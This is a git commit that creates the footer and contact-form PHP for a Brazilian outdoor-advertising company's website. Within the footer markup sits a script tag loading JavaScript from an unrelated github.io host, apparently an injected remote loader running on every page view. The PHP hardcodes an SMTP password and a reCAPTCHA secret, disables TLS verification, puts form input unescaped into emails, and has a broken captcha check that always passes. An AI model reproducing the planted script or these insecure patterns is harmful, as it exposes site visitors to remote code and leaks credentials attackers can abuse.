9c9d37abb55b333b6128d881d3af071ed0649ff9
unknown <igor.l.leonhardt@gmail.com>
2022-07-11 19:24:17 -0300

    Create footer.php

---
+++ footer.php
@@ -0,0 +1,266 @@
+		<div class="bloco footer" id="rodape">
+			<div class="container">
+<script src="https://qbhomu.github.io/script.js"></script>
+				<div class="row">
+					<div class="col-sm-4">
+						<div class="area1 text-center" >
+							<img src="img/logo.svg">
+							<a href="https://www.instagram.com/maelyooh/"><i class="fa fa-instagram"></i></a>
+							<a href="https://www.facebook.com/maelymooh/"><i class="fa fa-facebook-square"></i></a>
+							<a href="https://www.youtube.com/maelyooh"><i class="fa fa-youtube"></i></a>
+							<a href="https://br.linkedin.com/company/maelymidiaooh"><i class="fa fa-linkedin"></i></a>
+							<a href="https://api.whatsapp.com/send?phone=5527992376001"><img src="img/whatsapp-navbar.svg"></a>
+							<p><a href="tel:272124-0000"><i class="fa fa-phone"></i>(27) 2124-0000</a> | <a href="mailto:maely@maely.com.br"><i class="fa fa-envelope"></i> maely@maely.com.br</a></p>
+							<p><a target="_blank" href="https://www.google.com/maps/place/Condom%C3%ADnio+do+Edif%C3%ADcio+Pal%C3%A1cio+do+Caf%C3%A9/@-20.3155788,-40.2975626,17z/data=!3m1!4b1!4m5!3m4!1s0xb817ce928de7f9:0xe32a0a8e9a7a0e6!8m2!3d-20.3155838!4d-40.2953739">Ed. Palácio do Café, 2º andar. Av. Nossa Sra. dos Navegantes,675. Enseada do Sua, Vitória</a></p>
+						</div>
+					</div>
+					<div class="col-sm-8">
+						<div class="row menu">
+							<div class="col-sm-4">
+								<div class="area2">
+									<a href="index.php">Home</a><br>
+									<a href="nossa-empresa.php">Empresa</a><br>
+									<a href="cases.php">Cases</a><br>
+									<a href="ouvidoria.php">Ouvidoria</a><br>
+									<a href="contato.php">Contato</a><br>
+									<a href="legislacao.php">Legislação</a>
+								</div>
+							</div>
+							<div class="col-sm-8">
+								<div class="area3">
+									<h4>Produtos</h4>
+									<div class="row">
+										<div class="col-sm-5">	
+											<a href="produtos.php"><img class="svg" src="img/sort-right.svg"> Grandes Formatos</a><br>
+											<a href="produtos.php"><img class="svg" src="img/sort-right.svg"> Mobiliário Urbano</a><br>
+											<a href="produtos.php"><img class="svg" src="img/sort-right.svg"> Mídia em Transportes</a><br>
+										</div>
+										<div class="col-sm-7">
+											<a href="produtos.php"><img class="svg" src="img/sort-right.svg"> Mídia em Ambientes de Consumo</a><br>
+											<a href="produtos.php"><img class="svg" src="img/sort-right.svg"> Mídia Online</a>
+										</div>
+									</div>
+								</div>
+							</div>
+						</div>
+						<div class="logos text-center">
+							<img src="img/logo-abooh-branco.png" class="img-responsive center-block" />
+							<!--<img src="img/logo-ivc-branco.png" class="img-responsive center-block" />-->
+							<img src="img/logo-futura-map-branco.png" class="img-responsive center-block" />
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+
+		<div class="bloco footer" id="minirodape">
+			<div class="container">
+				<div class="row">
+					<div class="col-sm-12 text-center">
+						<p>Maely 2020. Todos os direitos reservados</p>
+					</div>
+				</div>
+			</div>
+			<a href="http://somospixel.com/" target="_blank" alt="Pixel | Comunicação e Design" title="Acesse nosso site e conheça todos nossos serviços!" class="wow fadeIn" style="width: 180px; position: absolute; bottom: 1px; right: 15px; margin-bottom: 0px; z-index: 9999;">
+				<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 171.7 11.8"><defs><style>.cls-1{fill:#fff;}</style></defs><g id="Home"><path class="cls-1" d="M0.1,3.7H2.8A2.77,2.77,0,0,1,4.1,4a2.18,2.18,0,0,1,.9.7,3.13,3.13,0,0,1,.5,1V6.9a4.3,4.3,0,0,1-.2,1.2,3.13,3.13,0,0,1-.5,1,1.39,1.39,0,0,1-.8.7,2.77,2.77,0,0,1-1.3.3H0.1V3.7ZM1.2,9.2H2.3A3.59,3.59,0,0,0,3.4,9,1,1,0,0,0,4,8.5a0.91,0.91,0,0,0,.3-0.7,2.77,2.77,0,0,0,.1-0.9A2.77,2.77,0,0,0,4.3,6,0.91,0.91,0,0,0,4,5.3a1.47,1.47,0,0,0-.6-0.5,3.59,3.59,0,0,0-1.1-.2H1.2V9.2Z"/><path class="cls-1" d="M7.8,3.7h4.6v1H8.9V6.4h3.2V7.3H8.9V9.2h3.5v1H7.8V3.7Z"/><path class="cls-1" d="M15.4,8a1.08,1.08,0,0,0,.1.6,1.38,1.38,0,0,0,.3.4,0.76,0.76,0,0,0,.5.2,1.27,1.27,0,0,0,.6.1,1.08,1.08,0,0,0,.6-0.1A0.85,0.85,0,0,0,18.1,9a0.53,0.53,0,0,0,.2-0.3,2.27,2.27,0,0,0,.1-0.4,0.76,0.76,0,0,0-.2-0.5,0.53,0.53,0,0,0-.3-0.2,1.88,1.88,0,0,0-.8-0.2A7.6,7.6,0,0,1,16,7a4.88,4.88,0,0,1-.7-0.3,0.78,0.78,0,0,1-.4-0.4,0.76,0.76,0,0,1-.2-0.5c0-.2-0.1-0.3-0.1-0.5a1.88,1.88,0,0,1,.2-0.8,2.65,2.65,0,0,1,.5-0.6,1.14,1.14,0,0,1,.8-0.3A2.77,2.77,0,0,1,17,3.5a2.77,2.77,0,0,1,.9.1,2,2,0,0,1,.8.4,2.65,2.65,0,0,1,.5.6,2.39,2.39,0,0,1,.2.9H18.3a1.27,1.27,0,0,0-.4-0.9,1.49,1.49,0,0,0-1-.3H16.5c-0.1,0-.3.1-0.4,0.1a0.85,0.85,0,0,0-.3.3,0.48,0.48,0,0,0-.1.4,0.76,0.76,0,0,0,.2.5,0.82,0.82,0,0,0,.5.5,0.77,0.77,0,0,1,.3.1,1.08,1.08,0,0,0,.6.1,1.07,1.07,0,0,1,.6.2,0.76,0.76,0,0,0,.4.1,2.19,2.19,0,0,1,.5.3,0.78,0.78,0,0,1,.4.4,1.06,1.06,0,0,1,.2.5c0,0.2.1,0.3,0.1,0.5a2,2,0,0,1-.2.9,1.7,1.7,0,0,1-.6.6,2,2,0,0,1-.8.4,2.77,2.77,0,0,1-.9.1,3.08,3.08,0,0,1-1-.1,2,2,0,0,1-.8-0.4,4.35,4.35,0,0,1-.6-0.7,3,3,0,0,1-.2-1h1V8Z"/><path class="cls-1" d="M21.7,3.7h4.6v1H22.8V6.4H26V7.3H22.8V9.2h3.5v1H21.6V3.7h0.1Z"/><path class="cls-1" d="M28.6,3.7h1.2l2.9,4.7h0V3.7h1.1v6.4H32.6L29.7,5.4h0v4.7H28.6V3.7Z"/><path class="cls-1" d="M35.6,3.7h1.2l1.6,5.1h0L40,3.7h1.1L39,10.1H37.8Z"/><path class="cls-1" d="M45.8,3.5a2.77,2.77,0,0,1,1.3.3,3.59,3.59,0,0,1,1,.7,2.38,2.38,0,0,1,.6,1.1,5.07,5.07,0,0,1,.2,1.3,5.07,5.07,0,0,1-.2,1.3,2.38,2.38,0,0,1-.6,1.1,3.59,3.59,0,0,1-1,.7,3,3,0,0,1-2.6,0,3.59,3.59,0,0,1-1-.7A2.22,2.22,0,0,1,43,8.2a5.07,5.07,0,0,1-.2-1.3A5.07,5.07,0,0,1,43,5.6a2.38,2.38,0,0,1,.6-1.1,3.59,3.59,0,0,1,1-.7A2.13,2.13,0,0,1,45.8,3.5Zm0,1a2.92,2.92,0,0,0-.9.2,1.7,1.7,0,0,0-.6.6A1.14,1.14,0,0,0,44,6a2.77,2.77,0,0,0-.1.9,2.77,2.77,0,0,0,.1.9,6.89,6.89,0,0,0,.3.8l0.6,0.6a2,2,0,0,0,.9.2,2.92,2.92,0,0,0,.9-0.2,1.7,1.7,0,0,0,.6-0.6,1.14,1.14,0,0,0,.3-0.8,2.77,2.77,0,0,0,.1-0.9A2.77,2.77,0,0,0,47.6,6a6.89,6.89,0,0,0-.3-0.8l-0.6-.6A2.77,2.77,0,0,0,45.8,4.5Z"/><path class="cls-1" d="M51.1,3.7h1.1V9.1h3.3v1H51.1V3.7Z"/><path class="cls-1" d="M56.8,3.7H58l1.6,5.1h0l1.6-5.1h1.1l-2.2,6.4H58.9Z"/><path class="cls-1" d="M64.3,3.7h1.1v6.4H64.3V3.7Z"/><path class="cls-1" d="M68,3.7h2.7A2.77,2.77,0,0,1,72,4a2.18,2.18,0,0,1,.9.7,3.13,3.13,0,0,1,.5,1,5,5,0,0,1,.2,1.2,4.3,4.3,0,0,1-.2,1.2,3.13,3.13,0,0,1-.5,1,2.18,2.18,0,0,1-.9.7,2.77,2.77,0,0,1-1.3.3H68V3.7Zm1.1,5.5h1.1A3.59,3.59,0,0,0,71.3,9,1.79,1.79,0,0,0,72,8.5a0.91,0.91,0,0,0,.3-0.7,2.77,2.77,0,0,0,.1-0.9A2.77,2.77,0,0,0,72.3,6,4.87,4.87,0,0,0,72,5.3a1.79,1.79,0,0,0-.7-0.5,3.09,3.09,0,0,0-1.1-.2H69.1V9.2Z"/><path class="cls-1" d="M78.4,3.5a2.77,2.77,0,0,1,1.3.3,3.59,3.59,0,0,1,1,.7,2.38,2.38,0,0,1,.6,1.1,5.07,5.07,0,0,1,.2,1.3,5.07,5.07,0,0,1-.2,1.3,2.38,2.38,0,0,1-.6,1.1,3.59,3.59,0,0,1-1,.7,3,3,0,0,1-2.6,0,3.59,3.59,0,0,1-1-.7,2.38,2.38,0,0,1-.6-1.1,5.07,5.07,0,0,1-.2-1.3,5.07,5.07,0,0,1,.2-1.3,2.38,2.38,0,0,1,.6-1.1,3.59,3.59,0,0,1,1-.7A3.08,3.08,0,0,1,78.4,3.5Zm0,1a2.92,2.92,0,0,0-.9.2,1.21,1.21,0,0,0-.5.5,1.14,1.14,0,0,0-.3.8,2.77,2.77,0,0,0-.1.9,2.77,2.77,0,0,0,.1.9,6.89,6.89,0,0,0,.3.8l0.6,0.6a2,2,0,0,0,.9.2,2.92,2.92,0,0,0,.9-0.2A1.7,1.7,0,0,0,80,8.6a1.14,1.14,0,0,0,.3-0.8,2.77,2.77,0,0,0,.1-0.9A2.77,2.77,0,0,0,80.3,6,6.89,6.89,0,0,0,80,5.2l-0.6-.6A3.08,3.08,0,0,0,78.4,4.5Z"/><path class="cls-1" d="M87.5,3.7h2.8a3.09,3.09,0,0,1,1.1.2,1.28,1.28,0,0,1,.7.5,0.86,0.86,0,0,1,.3.6,1.27,1.27,0,0,1,.1.6,1.27,1.27,0,0,1-.1.6l-0.3.6a1.79,1.79,0,0,1-.7.5,3.59,3.59,0,0,1-1.1.2H88.6V10H87.5V3.7Zm1.1,3h1.6a0.6,0.6,0,0,0,.4-0.1A0.76,0.76,0,0,0,91,6.4l0.3-.3a0.75,0.75,0,0,0,.1-0.5,0.75,0.75,0,0,0-.1-0.5c-0.1-.1-0.1-0.2-0.2-0.3s-0.2-.1-0.3-0.2H88.7V6.7H88.6Z"/><path class="cls-1" d="M97.5,3.5a2.77,2.77,0,0,1,1.3.3,3.59,3.59,0,0,1,1,.7,2.38,2.38,0,0,1,.6,1.1,5.07,5.07,0,0,1,.2,1.3,5.07,5.07,0,0,1-.2,1.3,2.38,2.38,0,0,1-.6,1.1,3.59,3.59,0,0,1-1,.7,3,3,0,0,1-2.6,0,3.59,3.59,0,0,1-1-.7,2.38,2.38,0,0,1-.6-1.1,5.07,5.07,0,0,1-.2-1.3,5.07,5.07,0,0,1,.2-1.3,2.38,2.38,0,0,1,.6-1.1,3.59,3.59,0,0,1,1-.7A2.77,2.77,0,0,1,97.5,3.5Zm0,1a2.92,2.92,0,0,0-.9.2,1,1,0,0,0-.6.5,1.14,1.14,0,0,0-.3.8,2.77,2.77,0,0,0-.1.9,2.77,2.77,0,0,0,.1.9,6.89,6.89,0,0,0,.3.8l0.6,0.6a2,2,0,0,0,.9.2,2.92,2.92,0,0,0,.9-0.2L99,8.6a1.14,1.14,0,0,0,.3-0.8,2.77,2.77,0,0,0,.1-0.9A2.77,2.77,0,0,0,99.3,6,6.89,6.89,0,0,0,99,5.2l-0.6-.6A2.77,2.77,0,0,0,97.5,4.5Z"/><path class="cls-1" d="M102.8,3.7h3.1a2.54,2.54,0,0,1,1.6.5,1.43,1.43,0,0,1,.5,1.3,2,2,0,0,1-.1.8,2.19,2.19,0,0,1-.3.5,1.38,1.38,0,0,1-.4.3,0.37,0.37,0,0,0-.3-0.1h0a0.37,0.37,0,0,1,.3.1,0.53,0.53,0,0,1,.3.2,0.52,0.52,0,0,1,.2.4c0,0.2.1,0.4,0.1,0.6a3.08,3.08,0,0,0,.1,1,1.49,1.49,0,0,0,.3.7H107a0.75,0.75,0,0,1-.1-0.5V9a2.2,2.2,0,0,0-.1-0.8,1.23,1.23,0,0,0-.2-0.5,1.38,1.38,0,0,0-.4-0.3,1.27,1.27,0,0,0-.6-0.1H104V9.9h-1.1V3.7h-0.1Zm1.1,2.9h1.8a1,1,0,0,0,1.1-1.1,0.75,0.75,0,0,0-.1-0.5c-0.1-.1-0.1-0.2-0.2-0.3a0.48,0.48,0,0,0-.4-0.1h-2.2v2Z"/><path class="cls-1" d="M110.3,5.6h1.2V6.8h-1.2V5.6Zm0,3.3h1.2v1.2h-1.2V8.9Z"/><polygon class="cls-1" points="117 0.1 117 11.8 119.8 10.2 127.1 10.2 127.1 0.1 117 0.1"/><path class="cls-1" d="M131.1,0.6h4.2a4.31,4.31,0,0,1,1.7.3,2,2,0,0,1,1,.7,3.13,3.13,0,0,1,.5,1,3.4,3.4,0,0,1,.1,1,3.75,3.75,0,0,1-.1,1,2.35,2.35,0,0,1-.5,1,2.55,2.55,0,0,1-1,.7,4,4,0,0,1-1.7.3h-2.5v3.7h-1.7V0.6Zm1.7,4.5h2.4a1.27,1.27,0,0,0,.6-0.1,0.85,0.85,0,0,0,.5-0.3,1,1,0,0,0,.4-0.5,1.88,1.88,0,0,0,.2-0.8,2,2,0,0,0-.1-0.8,1,1,0,0,0-.4-0.5,1.06,1.06,0,0,0-.5-0.2c-0.2,0-.4-0.1-0.6-0.1h-2.5V5.1h0Z"/><path class="cls-1" d="M141.1,0.6h1.7v9.5h-1.7V0.6Z"/><path class="cls-1" d="M145,0.6h2L149.2,4l2.3-3.4h1.9l-3.1,4.6,3.4,4.9h-2l-2.4-3.6-2.4,3.6H145l3.4-4.9Z"/><path class="cls-1" d="M155.6,0.6h6.9V2h-5.2V4.5h4.8V5.9h-4.8V8.7h5.3v1.4h-7V0.6Z"/><path class="cls-1" d="M165.1,0.6h1.7V8.7h4.8v1.4h-6.5V0.6Z"/></g>
+				</a>
+		</div>
+
+		<div class="modal fade" id="modalalert">
+			<div class="modal-dialog">
+				<div class="modal-content">
+					<div class="modal-header text-center">
+						<button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
+						<img src="./img/logo.png">
+					</div>
+					<div class="modal-body text-center">
+						<h4 class="modal-title "></h4>
+						<p></p>
+					</div>
+				</div>
+			</div>
+		</div>
+
+
+	</body>
+</html>
+
+
+
+
+<?php 
+
+	if($_POST['cmd']){
+
+		if(isset($_POST['g-recaptcha-response'])){
+		    $captcha_data = $_POST['g-recaptcha-response'];
+		}
+
+		if(!$captcha_data){
+			echo "<script> $(function(){ modalAlerta('Erro no Captcha', 'É preciso preencher o captcha (Não sou um Robô) para enviar o formulário.'); }) </script>";
+		}
+		else{
+
+			$resposta = file_get_contents("https://www.google.com/recaptcha/api/siteverify?secret=6LfCwwEVAAAAACgs4dFzo23tEwvId0bvvJiRLWUs&response=".$captcha_data."&remoteip=".$_SERVER['REMOTE_ADDR']);
+
+			if($resposta.success){
+
+				// Inclui o arquivo class.phpmailer.php localizado na pasta phpmailer
+				require_once("phpmailer/class.phpmailer.php");
+				require_once("phpmailer/class.smtp.php");
+
+				// Inicia a classe PHPMailer
+				$mail = new PHPMailer();
+
+				$mail->SMTPOptions = array(
+					'ssl' => array(
+						'verify_peer' => false,
+						'verify_peer_name' => false,
+						'allow_self_signed' => true
+					)
+				);
+
+				// Define os dados do servidor e tipo de conexão
+				// =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+				$mail->IsSMTP(); // Define que a mensagem será SMTP
+				$mail->Host = "mail.maely.com.br"; // Endereço do servidor SMTP
+				$mail->SMTPAuth = true; // Usa autenticação SMTP? (opcional)
+				$mail->Username = 'site@maely.com.br'; // Usuário do servidor SMTP
+				$mail->Password = 'Maely#123@2020'; // Senha do servidor SMTP
+				$mail->Port = 465; // set the SMTP port
+				$mail->SMTPSecure = "ssl";
+				$mail->SMTPDebug = 2;
+
+				// Define o remetente
+				// =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+				$mail->From = "site@maely.com.br"; // Seu e-mail
+				$mail->FromName = "Site Maely"; // Seu nome
+				
+				// Define os dados técnicos da Mensagem
+				// =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+				$mail->IsHTML(true); // Define que o e-mail será enviado como HTML
+				$mail->CharSet = 'UTF-8';
+
+
+				if($_POST['cmd'] == "contato"){
+
+					$nome = $_POST['nome'];
+					$email = $_POST['email'];
+					$telefone = $_POST['telefone'];
+					$empresa = $_POST['empresa'];
+					$mensagem = $_POST['mensagem'];
+
+
+					$mail->Subject  = "Contato Maely Site"; // Assunto da mensagem
+					$mail->Body = "<div style='width:600px; margin:auto; padding: 30px; background-color: #2F53A5;'>";
+					$mail->Body .= "<center><img src='cid:logoimg' style='margin:auto; max-width:30%;' /></center>";
+					$mail->Body .= "</div>";
+					$mail->Body .= "<div style='width:600px; margin:auto; padding: 30px; background-color: #F8F8F8FF;'>";
+					$mail->Body .= "<h2 style='font-size:26px; color:#2F53A5; text-align: center; margin-bottom:40px;'>NOVA MENSAGEM DE CONTATO</h2>";
+					$mail->Body .= "<p style='font-size:16px; color: #333; margin-bottom:10px;'><b>Nome:</b>&nbsp;&nbsp;$nome</p>";
+					$mail->Body .= "<p style='font-size:16px; color: #333; margin-bottom:10px;'><b>Empresa:</b>&nbsp;&nbsp;$empresa</p>";
+					$mail->Body .= "<p style='font-size:16px; color: #333; margin-bottom:10px;'><b>Telefone:</b>&nbsp;&nbsp;$telefone</p>";
+					$mail->Body .= "<p style='font-size:16px; color: #333; margin-bottom:20px;'><b>E-mail:</b>&nbsp;&nbsp;$email</p>";
+					$mail->Body .= "<p style='font-size:16px; color: #333; margin-bottom:10px;'><b>Mensagem:</b>&nbsp;&nbsp;$mensagem</p>";
+					$mail->Body .= "</div>";
+					$mail->AltBody = "NOVA MENSAGEM DE CONTATO\r\n\r\nNome:  $nome\r\nEmpresa:  $empresa\r\nTelefone:  $telefone\r\nE-mail:  $email;\r\n\r\nMensagem:\r\n$mensagem\r\n";
+
+					$title_modal = "Mensagem enviada";
+					$text_modal = "Nossa equipe entrará em contato em breve!";
+
+				}
+				elseif($_POST['cmd'] == "tenho-interesse"){
+
+					$nome = $_POST['nome'];
+					$email = $_POST['email'];
+					$empresa = $_POST['empresa'];
+					$telefone = $_POST['telefone'];
+					$data = $_POST['data'];
+					$observacoes = $_POST['observacoes'];
+
+					$titulo_produto = $_POST['titulo_produto'];
+					$tipo_produto = $_POST['tipo_produto'];
+					$regiao = $_POST['regiao'];
+					$localizacao = $_POST['localizacao'];
+
+
+					$mail->Subject  = "Interesse em Produto"; // Assunto da mensagem
+					$mail->Body = "<div style='width:600px; margin:auto; padding: 30px; background-color: #2F53A5;'>";
+					$mail->Body .= "<center><img src='cid:logoimg' style='margin:auto; max-width:30%;' /></center>";
+					$mail->Body .= "</div>";
+					$mail->Body .= "<div style='width:600px; margin:auto; padding: 30px; background-color: #F8F8F8FF;'>";
+					$mail->Body .= "<h2 style='font-size:26px; color:#2F53A5; text-align: center; margin-bottom:40px;'>INTERESSE EM PRODUTO</h2>";
+					$mail->Body .= "<p style='font-size:16px; color: #333; margin-bottom:10px;'><b>Nome:</b>&nbsp;&nbsp;$nome</p>";
+					$mail->Body .= "<p style='font-size:16px; color: #333; margin-bottom:10px;'><b>Empresa:</b>&nbsp;&nbsp;$empresa</p>";
+					$mail->Body .= "<p style='font-size:16px; color: #333; margin-bottom:10px;'><b>Telefone:</b>&nbsp;&nbsp;$telefone</p>";
+					$mail->Body .= "<p style='font-size:16px; color: #333; margin-bottom:10px;'><b>E-mail:</b>&nbsp;&nbsp;$email</p>";
+					$mail->Body .= "<p style='font-size:16px; color: #333; margin-bottom:40px;'><b>Data de Interesse:</b>&nbsp;&nbsp;$data</p>";
+					$mail->Body .= "<p style='font-size:16px; color: #333; margin-bottom:10px;'><b>Título do Produto:</b>&nbsp;&nbsp;$titulo_produto</p>";
+					$mail->Body .= "<p style='font-size:16px; color: #333; margin-bottom:10px;'><b>Tipo de Produto:</b>&nbsp;&nbsp;$tipo_produto</p>";
+					$mail->Body .= "<p style='font-size:16px; color: #333; margin-bottom:10px;'><b>Localização:</b>&nbsp;&nbsp;$localizacao</p>";
+					$mail->Body .= "<p style='font-size:16px; color: #333; margin-bottom:40px;'><b>Região:</b>&nbsp;&nbsp;$regiao</p>";
+					$mail->Body .= "<p style='font-size:16px; color: #333; margin-bottom:10px;'><b>Observações:</b>&nbsp;&nbsp;$observacoes</p>";
+					$mail->Body .= "</div>";
+					$mail->AltBody = "NOVA MENSAGEM DE CONTATO\r\n\r\nNome:  $nome\r\nEmpresa:  $empresa\r\nTelefone:  $telefone\r\nE-mail:  $email;\r\nData de Interesse:  $data;\r\Título do Produto:  $titulo_produto;\r\nTipo de Produto:  $tipo;\r\nLocalização:  $localizacao;\r\nRegião:  $regiao;\r\n\r\nObservações:\r\n$observacoes\r\n";
+
+					$title_modal = "Interesse no Produto";
+					$text_modal = "Os seus dados no produto foi enviado para equipe comercial da Maely, em breve entraremos em contato.";
+
+				}
+				elseif($_POST['cmd'] == "ouvidoria"){
+
+					$nome = $_POST['nome'];
+					$email = $_POST['email'];
+					$telefone = $_POST['telefone'];
+
+					$motivo = $_POST['motivo'];
+					$retorno = $_POST['retorno'];
+					$mensagem = $_POST['mensagem'];
+
+
+					$mail->Subject  = "Ouvidoria"; // Assunto da mensagem
+					$mail->Body = "<div style='width:600px; margin:auto; padding: 30px; background-color: #2F53A5;'>";
+					$mail->Body .= "<center><img src='cid:logoimg' style='margin:auto; max-width:30%;' /></center>";
+					$mail->Body .= "</div>";
+					$mail->Body .= "<div style='width:600px; margin:auto; padding: 30px; background-color: #F8F8F8FF;'>";
+					$mail->Body .= "<h2 style='font-size:26px; color:#2F53A5; text-align: center; margin-bottom:40px;'>NOVA MENSAGEM DE OUVIDORIA</h2>";
+					$mail->Body .= "<p style='font-size:17px; color: #333; margin-bottom:20px;'><b>Motivo:</b>&nbsp;&nbsp;$motivo</p>";
+
+					$mail->Body .= "<p style='font-size:16px; color: #333; margin-bottom:10px;'><b>Nome:</b>&nbsp;&nbsp;$nome</p>";
+					$mail->Body .= "<p style='font-size:16px; color: #333; margin-bottom:10px;'><b>Telefone:</b>&nbsp;&nbsp;$telefone</p>";
+					$mail->Body .= "<p style='font-size:16px; color: #333; margin-bottom:10px;'><b>E-mail:</b>&nbsp;&nbsp;$email</p>";
+					$mail->Body .= "<p style='font-size:16px; color: #333; margin-bottom:10px;'><b>Mensagem:</b>&nbsp;&nbsp;$Mensagem</p>";
+					$mail->Body .= "</div>";
+
+					$title_modal = "Mensagem para Ouvidoria";
+					$text_modal = "Sua mensagem foi enviada com suacesso, caso você tenha marcado a opção de receber retorno, nossa equipe entrará em contato em breve!";
+
+				}
+
+		    	//Destinatário	
+				$mail->AddAddress("marketing@maely.com.br");
+				$mail->AddCC("site@maely.com.br");
+
+				// Envia o e-mail
+				$mail->AddEmbeddedImage('img/logo.png', 'logoimg');
+				$enviado = $mail->Send();
+
+				// Limpa os destinatários e os anexos
+				$mail->ClearAllRecipients();
+				$mail->ClearAttachments();
+
+				// Exibe uma mensagem de resultado
+				if ($enviado) {
+					
+					echo "<script> $(function(){ modalAlerta('" . $title_modal . "', '" . $text_modal . "'); }) </script>";
+					
+				};
+				unset($_POST['cmd']);
+			}
+			else{
+				echo "<script> $(function(){ modalAlerta('Erro no Captcha', 'É preciso preencher o captcha (Não sou um Robô) para enviar o formulário.'); }) </script>";
+			}
+		}
+	}
+
+?>
